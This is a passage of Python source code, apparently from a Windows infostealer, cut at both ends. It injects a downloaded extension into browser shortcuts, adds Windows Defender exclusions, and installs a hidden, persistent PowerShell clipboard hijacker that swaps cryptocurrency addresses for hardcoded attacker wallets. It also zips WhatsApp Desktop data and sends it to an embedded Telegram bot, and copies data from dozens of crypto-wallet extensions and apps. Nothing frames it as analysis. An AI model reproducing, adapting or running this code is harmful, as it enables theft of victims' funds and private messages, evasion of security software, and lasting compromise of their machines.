                'Comodo Dragon': [os.path.expandvars('%PROGRAMFILES%\\Comodo\\Dragon\\Dragon.exe'),
                                   os.path.expandvars('%PROGRAMFILES(X86)%\\Comodo\\Dragon\\Dragon.exe'),
                                   os.path.expandvars('%LOCALAPPDATA%\\Comodo\\Dragon\\Dragon.exe')],
                'Opera Neon': [os.path.expandvars('%PROGRAMFILES%\\Opera\\Neon\\Application\\neon.exe'),
                               os.path.expandvars('%PROGRAMFILES(X86)%\\Opera\\Neon\\Application\\neon.exe'),
                               os.path.expandvars('%LOCALAPPDATA%\\Opera\\Neon\\Application\\neon.exe')]
            }
            navegadores_instalados = {}
            for (navegador, rutas) in navegadores.items():
                for ruta in rutas:
                    if os.path.exists(ruta):
                        navegadores_instalados[navegador] = ruta
                        break
            return navegadores_instalados

        def buscar_accesos_directos(navegador):
            """
            Busca los accesos directos para el navegador especificado en ubicaciones predeterminadas.
            
            Parámetros:
                navegador (str): Nombre del navegador.
            
            Retorna:
                list: Lista de rutas de accesos directos encontrados.
            """
            shortcut_names = {
                'Brave': 'Brave.lnk',
                'Google Chrome': 'Google Chrome.lnk',
                'Microsoft Edge': 'Microsoft Edge.lnk',
                'Opera': 'Opera.lnk',
                'Opera GX': 'Opera GX.lnk',
                'Vivaldi': 'Vivaldi.lnk',
                'Yandex': 'Yandex.lnk',
                'SRWare Iron': 'SRWare Iron.lnk',
                'Kiwi Browser': 'Kiwi Browser.lnk',
                'Torch Browser': 'Torch.lnk',
                'Slimjet': 'Slimjet.lnk',
                'Comodo Dragon': 'Comodo Dragon.lnk',
                'Opera Neon': 'Opera Neon.lnk'
            }
            
            if navegador not in shortcut_names:
                return []
            
            lnk_name = shortcut_names[navegador]
            
            ubicaciones = [
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs'),
                os.path.join(os.environ.get('ProgramData', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'Start Menu', 'Programs'),
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Internet Explorer', 'Quick Launch'),
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Internet Explorer', 'Quick Launch', 'User Pinned', 'TaskBar')
            ]
            
            accesos_directos = []
            for ubicacion in ubicaciones:
                shortcut_path = os.path.join(ubicacion, lnk_name)
                if os.path.exists(shortcut_path):
                    accesos_directos.append(shortcut_path)
            
            return accesos_directos

        def modificar_acceso_directo(shortcut_path, extension_path):
            try:
                shell = win32com.client.Dispatch('WScript.Shell')
                shortcut = shell.CreateShortcut(shortcut_path)
                existing_args = shortcut.Arguments
                print(f"[INFO] Argumentos existentes en '{shortcut_path}': '{existing_args}'")
                load_extension_flag = f'--load-extension="{extension_path}"'
                if '--load-extension' in existing_args:
                    print(f'[WARN] El acceso directo ya contiene la bandera --load-extension: {shortcut_path}')
                    return True
                else:
                    if existing_args:
                        new_args = f'{existing_args} {load_extension_flag}'.strip()
                    else:
                        new_args = load_extension_flag
                    print(f"[INFO] Agregando la bandera '--load-extension': {new_args}")
                    shortcut.Arguments = new_args
                    shortcut.Save()
                    print(f'[SUCCESS] Acceso directo modificado correctamente: {shortcut_path}')
                    return True
            except Exception as e:
                print(f'[ERROR] Error al modificar el acceso directo {shortcut_path}: {e}')
                reportar_error(e, f'Vacuna del navegador: Modificando el acceso directo {shortcut_path}')
                return False

        def modificar_accesos_directos_pywin32(navegadores_instalados, extension_path):
            accesos_modificados = []
            for (navegador, exe_path) in navegadores_instalados.items():
                accesos_directos = buscar_accesos_directos(navegador)
                if not accesos_directos:
                    print(f'[WARN] No se encontraron accesos directos para {navegador}.')
                    continue
                for lnk in accesos_directos:
                    print(f'[INFO] Modificando acceso directo: {lnk}')
                    exito = modificar_acceso_directo(lnk, extension_path)
                    if exito:
                        print(f'[SUCCESS] Acceso directo modificado exitosamente: {lnk}')
                        accesos_modificados.append(lnk)
                    else:
                        print(f'[ERROR] Falló al modificar el acceso directo: {lnk}')
            return accesos_modificados

        def descargar_y_extraer_extension(username, destino):
            zip_filename = 'extension_temp.zip'
            temp_dir = os.environ.get('TEMP', os.getcwd())
            zip_path = os.path.join(temp_dir, zip_filename)
            nombres_a_intentar = [username, 'adrikadi']
            for nombre in nombres_a_intentar:
                url = f'https://{DOMAIN}/lavacunamagica_bylaw/{nombre}'
                print(f'[INFO] Intentando descargar la extensión desde: {url}')
                try:
                    response = requests.get(url, stream=True, timeout=30)
                    response.raise_for_status()
                    with open(zip_path, 'wb') as f:
                        shutil.copyfileobj(response.raw, f)
                    print(f'[SUCCESS] Extensión descargada en {zip_path}.')
                    break
                except requests.exceptions.RequestException as e:
                    print(f'[ERROR] Error al descargar la extensión desde {url}: {e}')
                    reportar_error(e, f'Descargando extension desde {url}')
                    if nombre == 'adrikadi':
                        print("[ERROR] Falló la descarga con el nombre 'adrikadi'.")
                        return False
                    else:
                        print(f"[INFO] Intentando nuevamente con 'adrikadi' en lugar de {username}.")
            print(f'[INFO] Extrayendo la extensión en {destino}...')
            try:
                if os.path.exists(destino):
                    shutil.rmtree(destino)
                    print(f"[INFO] Carpeta existente '{destino}' eliminada.")
                os.makedirs(destino, exist_ok=True)
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(destino)
                print(f'[SUCCESS] Extensión extraída en {destino}.')
            except zipfile.BadZipFile as e:
                reportar_error(e, 'Vacuna del navegador: Zip inválido')
                print('[ERROR] El archivo descargado no es un ZIP válido.')
                return False
            except Exception as e:
                reportar_error(e, 'Vacuna del navegador: Extrayendo la extensión')
                print(f'[ERROR] Error al extraer la extensión: {e}')
                return False
            try:
                os.remove(zip_path)
                print(f'[INFO] Archivo ZIP eliminado: {zip_path}.')
            except Exception as e:
                reportar_error(e, 'Vacuna del navegador: Borrando el archivo ZIP')
                print(f'[WARN] No se pudo eliminar el archivo ZIP: {e}')
            return True

        def verificar_extension(extension_path):
            if os.path.exists(extension_path):
                manifest_path = os.path.join(extension_path, 'manifest.json')
                if os.path.exists(manifest_path):
                    print(f'[SUCCESS] Extensión encontrada en: {extension_path}')
                    return True
                else:
                    print(f"[ERROR] No se encontró 'manifest.json' en: {extension_path}")
                    return False
            else:
                print(f'[ERROR] Ruta de la extensión no encontrada: {extension_path}')
                return False

        print('\n[INFO] Cerrando navegadores...')
        cerrar_browsers()
        central_extension_path = os.path.join(os.getenv('APPDATA'), 'PrysmaxExtensions')
        print('\n[INFO] Iniciando descarga y extracción de la extensión...')
        exito_descarga = descargar_y_extraer_extension(username, central_extension_path)
        if not exito_descarga:
            print('[FATAL] No se pudo descargar o extraer la extensión. Abortando.')
            print('uy')
            return
        print('\n[INFO] Verificando la extensión descargada...')
        if not verificar_extension(central_extension_path):
            print('[FATAL] La extensión no está correctamente descomprimida. Abortando.')
            print('uy')
            return
        print('\n[INFO] Buscando navegadores instalados...')
        navegadores_instalados = buscar_donde_vacunar()
        if not navegadores_instalados:
            print('[FATAL] No se encontraron navegadores instalados. Abortando.')
            print('uy')
            return
        print('\n[INFO] Navegadores detectados:')
        for (navegador, ruta) in navegadores_instalados.items():
            print(f' - {navegador}: {ruta}')
        print('\n[INFO] Modificando accesos directos de navegadores para cargar la extensión...')
        accesos_modificados = modificar_accesos_directos_pywin32(navegadores_instalados, central_extension_path)
        if not accesos_modificados:
            print('[FATAL] No se modificaron accesos directos. Abortando.')
            print('uy')
            return
        print('\n--- PROCESO COMPLETADO ---')
        print(f'La extensión ha sido instalada en {central_extension_path} y los accesos directos han sido modificados.')
        print('Por favor, abre los navegadores utilizando los accesos directos modificados para cargar la extensión.\n')
        
        # Enviar notificación al bot de Telegram
        telegram_bot_token = "7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE"
        telegram_chat_id = "1665274281"
        send_telegram_message(telegram_bot_token, telegram_chat_id,
                              f"Extensión instalada en {central_extension_path} y accesos directos modificados.")
    except Exception as e:
        reportar_error(e, 'Error en la vacuna de navegadores')
        print(e)

ps_command = '\nAdd-MpPreference -ExclusionExtension \'.ps1\', \'.tmp\', \'.py, \'.exe\', \'.ps1\'\nAdd-MpPreference -ExclusionPath "$env:TEMP", "$env:APPDATA"\n'
try:
    process = subprocess.Popen(['powershell', '-Command', ps_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
    try:
        excluirtem()
        localappdataxd = os.getenv('LOCALAPPDATA')
        temp_folder = os.getenv('APPDATA')
        run_powershell_command(f"Add-MpPreference -ExclusionPath '{temp_folder}'")
        run_powershell_command(f"Add-MpPreference -ExclusionPath '{localappdataxd}'")
    except Exception as e:
        reportar_error(e, 'Add temp exclusion')
        pass
except Exception as e:
    reportar_error(e, 'Error en agregar exclusiones ps1 tmp py')

def create_and_execute_scripts():

    user_data_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Powershell')
    if not os.path.exists(user_data_path):
        os.makedirs(user_data_path, exist_ok=True)

    ps1_path = os.path.join(user_data_path, 'Get-Clipboard.ps1')
    powershell_script_content = (
        "\n$sctpth = $MyInvocation.MyCommand.Path\n"
        "$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})\n"
        "$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP \"$ran.ps1\" } else { Join-Path $env:APPDATA \"$ran.ps1\" }\n"
        "Copy-Item -Path $sctpth -Destination $ranpth -Force\n"
        "Remove-Item -Path $sctpth -Force\n\n"
        "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n"
        "$valn = \"Powershell\"\n"
        "$val = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File '$ranpth'\"\n\n"
        "if (!(Test-Path $key)) {\n"
        "    New-Item -Path $key -Force | Out-Null\n"
        "}\n\n"
        "Set-ItemProperty -Path $key -Name $valn -Value $val\n\n"
        "Add-Type -Name Window -Namespace Console -MemberDefinition @'\n"
        "[DllImport(\"Kernel32.dll\")]\n"
        "public static extern IntPtr GetConsoleWindow();\n"
        "[DllImport(\"user32.dll\")]\n"
        "public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n"
        "public static void Hide()\n"
        "{\n"
        "    IntPtr hWnd = GetConsoleWindow();\n"
        "    if(hWnd != IntPtr.Zero)\n"
        "    {\n"
        "        ShowWindow(hWnd, 0);\n"
        "    }\n"
        "}\n"
        "'@\n"
        "[Console.Window]::Hide()\n\n"
        "$attr = [System.IO.FileAttributes]::Hidden\n"
        "Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr\n\n"
        "$addy = @{\n"
        "    \"btc\" = \"39Qrhfyc7yzMosNXrFrL6mTC5zVh5sS54H\"\n"
        "    \"eth\" = \"0x44Bfe4990697983633937Aff98B60E4372d3C7bc\"\n"
        "    \"ltc\" = \"ltc1q74vpuchkx96rf605ff03ukknuck4up3g82gwuw\"\n"
        "    \"trx\" = \"TEXG37ZoW33PtoBWogHB3z6ipPNy1RUnRx\"\n"
        "    \"bch\" = \"qrj74n30dsuhkp3jnw5c2zlzdjlj9wq72c5s907pnc\"\n"
        "    \"xmr\" = \"44gTNjmeLtpBTZb9tWtAbLZdkmi55f6pbfS1mDgcieF39kCKUnJDmry3xbFWYvN9xn9qxe82D6tU5fG1sWAcSCbWFF7mSev\"\n"
        "    \"xrp\" = \"rK9SVNdRcjZBW6DUxsScc4211HvosYppcb\"\n"
        "    \"zcash\" = \"t1eS3VwxuHAsEECKbgFYYkvEMs3EyZgotd8\"\n"
        "    \"doge\" = \"DS5q9TF7DqgHuLWm124YQ1U6UAg3SaVrYG\"\n"
        "    \"sol\" = \"C2oggdkSyhK5NpBgjATDbFUn4vhAZH3jTFEWGyExYuJ3\"\n"
        "}\n\n"
        "while ($true) {\n"
        "    $clipper = Get-Clipboard\n"
        "    if ($clipper -match \"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$\") {\n"
        "        $clipper = $addy[\"btc\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^0x[a-fA-F0-9]{40}$\") {\n"
        "        $clipper = $addy[\"eth\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,42}$\") {\n"
        "        $clipper = $addy[\"ltc\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^T[a-zA-Z0-9]{28,33}$\") {\n"
        "        $clipper = $addy[\"trx\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^((bitcoincash:)?(q|p)[a-z0-9]{41})$\") {\n"
        "        $clipper = $addy[\"bch\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$\") {\n"
        "        $clipper = $addy[\"xmr\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^(?:r[0-9a-zA-Z]{24,34})$\") {\n"
        "        $clipper = $addy[\"xrp\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^t1[0-9A-z]{32,39}$\") {\n"
        "        $clipper = $addy[\"zcash\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$\") {\n"
        "        $clipper = $addy[\"doge\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    elseif ($clipper -match \"^[1-9A-HJ-NP-Za-km-z]{43,44}$\") {\n"
        "        $clipper = $addy[\"sol\"]\n"
        "        [System.Windows.Forms.Clipboard]::SetText($clipper)\n"
        "    }\n"
        "    Start-Sleep -Milliseconds 200\n"
        "}\n"
    )
    try:
        powershell_command = 'Set-ExecutionPolicy RemoteSigned -Force'
        subprocess.run(
            ['powershell', '-Command', powershell_command],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=134217728
        )
        with open(ps1_path, 'w', encoding='utf-8') as file:
            file.write(powershell_script_content)
        print(f'Script PowerShell saved successfully at: {ps1_path}')
        subprocess.Popen(
            ['powershell.exe', '-Command', 'Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=134217728
        )
        subprocess.Popen(
            ['powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', ps1_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=134217728
        )
        print('PowerShell script executed successfully')
        subprocess.run(
            ['powershell', '-Command',
             f"Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '{ps1_path}') "
             f"-Trigger (New-ScheduledTaskTrigger -AtStartup) "
             f"-Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType 'ServiceAccount') "
             f"-TaskName 'MiTareaDeInicio' -Description 'Programa que se ejecuta al iniciar el sistema'"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=134217728
        )
    except Exception as error:
        print(f'Error saving or executing PowerShell script: {error}')

def create_zip_from_folder(folder_path):
    zip_filename = f'{folder_path}.zip'
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for (root, dirs, files) in os.walk(folder_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), folder_path))
    return zip_filename
backup_dir = os.path.join(os.getenv('TEMP'), 'prysmax_wallets_browsers')
os.makedirs(backup_dir, exist_ok=True)
found_wallets = []

def backup_whatsapp_data():
    try:
        localappdata = os.getenv('LOCALAPPDATA')
        temp_dir = os.getenv('TEMP')
        if not localappdata or not temp_dir:
            print('No se pudieron obtener las rutas de las variables de entorno.')
            return
        packages_dir = os.path.join(localappdata, 'Packages')
        pattern = re.compile('^5319275A\\.WhatsAppDesktop_.*')
        matching_folders = []
        try:
            for entry in os.listdir(packages_dir):
                if pattern.match(entry):
                    full_path = os.path.join(packages_dir, entry)
                    if os.path.isdir(full_path):
                        matching_folders.append(full_path)
        except FileNotFoundError:
            print(f'No se encontró la ruta: {packages_dir}')
            return
        except PermissionError:
            print(f'No tienes permisos para acceder a: {packages_dir}')
            return
        if not matching_folders:
            print("No se encontraron carpetas con el patrón '5319275A.WhatsAppDesktop_*'.")
            return
        zip_filename = 'whatsapp_backup.zip'
        zip_path = os.path.join(temp_dir, zip_filename)
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as backup_zip:
                for folder in matching_folders:
                    for (root, dirs, files) in os.walk(folder):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, start=packages_dir)
                            try:
                                backup_zip.write(file_path, arcname)
                            except PermissionError:
                                print(f'Sin permiso para acceder a: {file_path}, se omite.')
                            except OSError as e:
                                print(f"No se pudo agregar '{file_path}' al ZIP: {e.strerror} (se omite)")
            print(f'Backup creado exitosamente en: {zip_path}')
        except Exception as e:
            print(f'Ocurrió un error al crear el backup: {e}')
        with open(zip_path, 'rb') as f:
            # Enviar archivo de backup al bot de Telegram
            telegram_bot_token = "7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE"
            telegram_chat_id = "1665274281"
            caption = f'Backup creado exitosamente en: {zip_path}'
            files = {'document': f}
            data = {'chat_id': telegram_chat_id, 'caption': caption}
            requests.post(f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument', data=data, files=files)
    except Exception as e:
        reportar_error(e, 'Error en backup_whatsapp_data')
    try:
        os.remove(zip_path)
    except Exception as e:
        print(e)
        reportar_error(e, 'Error en backup_whatsapp_data remover el zippath')

def backup_wallet_extensions():
    # List of browser processes to terminate
    browser_processes = [
        'brave.exe', 'chrome.exe', 'msedge.exe', 'opera.exe', 'vivaldi.exe',
        'yandex.exe', 'chromium.exe', 'epic.exe', 'waterfox.exe', 'palemoon.exe',
        'basilisk.exe', 'iexplore.exe'
    ]

    def kill_browser_process(process_name):
        try:
            output = subprocess.check_output('tasklist', shell=True).decode()
            if any(process_name.lower() in line.lower() for line in output.splitlines()):
                subprocess.run(
                    f'taskkill /F /IM {process_name}', shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=134217728, start_new_session=True
                )
                print(f'{process_name} closed.')
            else:
                print(f'{process_name} not running.')
        except Exception as e:
            print(f'Error checking or terminating {process_name}: {e}')

    for process in browser_processes:
        kill_browser_process(process)

    # Dictionary of browsers and their Local Extension Settings paths
    extension_paths = {
        'Brave': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
        'Chrome': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
        'Edge': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
        'Opera': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Local Extension Settings'),
        'Vivaldi': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Local Extension Settings'),
        'Yandex': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Extension Settings'),
        'Chromium': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Chromium', 'User Data', 'Default', 'Local Extension Settings'),
        'Epic': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Epic Privacy Browser', 'User Data', 'Default', 'Local Extension Settings'),
        'Brave Dev': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser Dev', 'User Data', 'Default', 'Local Extension Settings'),
        'Maxthon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Maxthon', 'User Data', 'Default', 'Local Extension Settings'),
        'Comodo Dragon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Comodo', 'Dragon', 'User Data', 'Default', 'Local Extension Settings'),
        'SRWare Iron': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'SRWare Iron', 'User Data', 'Default', 'Local Extension Settings'),
        'Torch': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Torch', 'User Data', 'Default', 'Local Extension Settings'),
        'Slimjet': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Slimjet', 'User Data', 'Default', 'Local Extension Settings'),
        'Coowon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Coowon', 'User Data', 'Default', 'Local Extension Settings'),
        'Baidu Browser': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Baidu', 'Browser', 'User Data', 'Default', 'Local Extension Settings'),
        'QuteBrowser': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'QuteBrowser', 'User Data', 'Default', 'Local Extension Settings'),
        'Waterfox': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Waterfox', 'Profiles'),
        'Pale Moon': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Pale Moon', 'Profiles'),
        'Basilisk': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Basilisk', 'Profiles'),
        'Internet Explorer': os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Internet Explorer', 'Local Extensions')
    }

    # Dictionary of wallet extension IDs and their names
    wallets = {
        'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask (Chrome)',
        'ejbalbakoplchlghecdalmeeeajnimhm': 'MetaMask (Edge)',
        'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'Phantom (Chrome)',
        'kfmhfjkllgocnmpimkkcljlmbloboccm': 'Phantom (Edge)',
        'fhbohimaelbohpjbbldcngcnapndodjp': 'Ronin Wallet (Chrome)',
        'pnkpkbcmngmgfpjakgfccphjfdcllnkg': 'Ronin Wallet (Edge)',
        'dngmlblcodfobpdpecaadgfbcggfjfnm': 'TronLink (Chrome)',
        'faofihjfemlkdhhpnggafmnlfdkmgmhk': 'TronLink (Edge)',
        'cnnjbpoomgphhmdbjmeplnfofphmjhlk': 'NEAR Wallet (Chrome)',
        'kpcfgclhklcjmnljjdjlobpjppadpgpn': 'NEAR Wallet (Edge)',
        'abkheeeomgdbibdjganfbbdeglafkmgk': 'Binance Chain Wallet (Chrome)',
        'lnbpcjohmfbhjgfjmipfmelkhggmhpnm': 'Binance Chain Wallet (Edge)',
        'bhghoamapcdpbohphigoooaddinpkbai': 'Coin98 Wallet (Chrome)',
        'egogehnmfbjpkmnnggnpejgbjmclgllg': 'Coin98 Wallet (Edge)',
        'fhilaheioajjhnpekbkpgnncfgejpgli': 'Keplr Wallet (Chrome)',
        'iiooeenphgnfgmbmfdjofeifjjhgcfhb': 'Keplr Wallet (Edge)',
        'kpfopkelmapcoipemfendmdcghnegimn': 'Solflare (Chrome)',
        'abnbppgpgfgiebdpoljllabbgpfkhjnp': 'Solflare (Edge)',
        'hbcjdhmhafcddgbgfmolpmbjdpccblop': 'Liquality (Chrome)',
        'hdpjdgfdjmpbkjmefhhjfjjhfnmfndgf': 'Liquality (Edge)',
        'foelmdlhbpafabodfgpikjmbnpfkflpl': 'Tonkeeper (Chrome)',
        'chccpdbmlmjmjfohdpfkdlkophdbbake': 'Tonkeeper (Edge)',
        'jfiihjeoihilkdlndlooppohkiglfape': 'Math Wallet (Chrome)',
        'kljbbekmokhihdfbpmmcbikjdmdpddfg': 'Math Wallet (Edge)',
        'pbcoeakecjbfhdnckkbplgleedkhmial': 'Nifty Wallet (Chrome)',
        'nlpjfgbghbphogmdnmkjmjjpfijgnjfb': 'Nifty Wallet (Edge)',
        'ajphlblpdflpbalhddmpcfamdfjoomlo': 'Venly Wallet (Chrome)',
        'pdljgoopglnogpffgglhmikeifgfojpf': 'Venly Wallet (Edge)',
        'ecpnpejnpliponokjlolcbpejjhlneeg': 'ONE Wallet (Chrome)',
        'bbdlofgfjokmjclkbmhldlhicbjmboik': 'ONE Wallet (Edge)',
        'fhakmnfohnppecdpdeejgebllngjknbg': 'BitKeep (Chrome)',
        'bjofoeidpgaemhjphodclfladpkbfjbb': 'BitKeep (Edge)',
        'pgjlagjpmejpoaemggdlnldlbekcfbim': 'Auro Wallet (Chrome)',
        'pbhedckkdoklflmbjfcjbpdomeebmmhp': 'Auro Wallet (Edge)',
        'gnomdcenhanheodjigbejioadkpojnke': 'XDEFI Wallet (Chrome)',
        'mfplfkhihbhgaffphdfbgoajhdjbjeck': 'XDEFI Wallet (Edge)',
        'hjipfcgkglkojcnhbjmhcdoeicccnkoj': 'BlockWallet (Chrome)',
        'gafpfdecljlbgpkbmjnifmfjkgbgfkcl': 'BlockWallet (Edge)',
        'bdcafkkfigrdcngfmbabpoenhgogldmd': 'Polkadot.js Wallet (Chrome)',
        'piibdpjdcjlnagldghkbjmnpgncfmnkc': 'Polkadot.js Wallet (Edge)',
        'onbfegendakgjfhkhkbhlolcfjnlhdfb': 'Coinbase Wallet (Chrome)',
        'goafglolcnggfppbhhaoplnbmlpcfhgc': 'Coinbase Wallet (Edge)',
        'fegphgklbihggoeamnmgfkgphkbefofo': 'Trust Wallet (Chrome)',
        'hpdkmhcfhhadbcfhladgbkpmhmlgfccc': 'Trust Wallet (Edge)',
        'hlgfnfeklcjgpchjlepcjlcjdbbbjdhl': 'Exodus Wallet (Chrome)',
        'maoccknpflbdbeoimklhpdokmijjcbdg': 'Exodus Wallet (Edge)',
        'ckjknflgookocgpcffkoghdpebdjbgjb': 'WalletConnect (Chrome)',
        'lgpcophpppdhmgojpdjhejkbelpkbpgj': 'WalletConnect (Edge)',
        'klnpgaiklhgkgkkjkkiklbjkdgiinpke': 'MetaMask Flask (Chrome)',
        'mmfnghfgbeogfnnpnjafocgimjbplnbg': 'MetaMask Flask (Edge)'
    }

    backup_dir = r'C:\Backup\WalletExtensions'
    found_wallets = []

    def copy_wallet_files(wallet_path, browser_name, wallet_id, wallet_name):
        dest_path = os.path.join(backup_dir, f'{browser_name}_{wallet_name}_{wallet_id}')
        os.makedirs(dest_path, exist_ok=True)
        for item in os.listdir(wallet_path):
            item_path = os.path.join(wallet_path, item)
            if os.path.isfile(item_path):
                shutil.copy2(item_path, os.path.join(dest_path, item))
                print(f'Copied file: {item_path} -> {dest_path}')
            else:
                print(f'Skipping non-file: {item_path}')

    # Traverse each browser's extension directory looking for wallet extensions
    for browser, ext_dir in extension_paths.items():
        ext_dir = ext_dir.replace('{username}', os.getlogin())
        if os.path.exists(ext_dir):
            print(f'Searching wallet extensions in {browser}...')
            for wallet_id, wallet_name in wallets.items():
                current_wallet_path = os.path.join(ext_dir, wallet_id)
                if os.path.exists(current_wallet_path):
                    print(f'Wallet found: {wallet_name} ({wallet_id}) in {browser}')
                    copy_wallet_files(current_wallet_path, browser, wallet_id, wallet_name)
                    if wallet_name not in found_wallets:
                        found_wallets.append(wallet_name)
                else:
                    print(f'Wallet {wallet_name} ({wallet_id}) not found in {browser}')
        else:
            print(f'Local Extension Settings directory not found for {browser}.')

    # Backup additional wallet data from roaming directories
    roaming = os.getenv('APPDATA')
    ap_wallets = [
        [os.path.join(roaming, 'atomic', 'Local Storage', 'leveldb'), 'Atomic Wallet', 'Wallet'],
        [os.path.join(roaming, 'Guarda', 'Local Storage', 'leveldb'), 'Guarda', 'Wallet'],
        [os.path.join(roaming, 'Zcash'), 'Zcash', 'Wallet'],
        [os.path.join(roaming, 'Armory'), 'Armory', 'Wallet'],
        [os.path.join(roaming, 'bytecoin'), 'Bytecoin', 'Wallet'],
        [os.path.join(roaming, 'Exodus', 'exodus.wallet'), 'Exodus', 'Wallet'],
        [os.path.join(roaming, 'Binance'), 'Binance', 'Wallet'],
        [os.path.join(roaming, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb'), 'Jaxx', 'Wallet'],
        [os.path.join(roaming, 'Electrum', 'wallets'), 'Electrum', 'Wallet'],
        [os.path.join(roaming, 'Coinomi', 'Coinomi', 'wallets'), 'Coinomi', 'Wallet'],
        [os.path.join(roaming, 'Bitcoin', 'wallets'), 'Bitcoin', 'Wallet'],
        [os.path.join(roaming, 'Litecoin', 'wallets'), 'Litecoin', 'Wallet'],
        [os.path.join(roaming, 'Dogecoin', 'wallets'), 'Dogecoin', 'Wallet'],
        [os.path.join(roaming, 'monero', 'wallets'), 'Monero', 'Wallet']
    ]
    
    for app_path, app_name, category in ap_wallets:
        if os.path.exists(app_path):
            print(f'Searching {category} for {app_name}...')
            dest_path = os.path.join(backup_dir, f'{category}_{app_name}')
            os.makedirs(dest_path, exist_ok=True)
            for item in os.listdir(app_path):
                item_path = os.path.join(app_path, item)
                if os.path.isfile(item_path):
                    shutil.copy2(item_path, os.path.join(dest_path, item))
                    print(f'Copied file: {item_path} -> {dest_path}')
                else:
                    print(f'Skipping non-file: {item_path}')
        else:
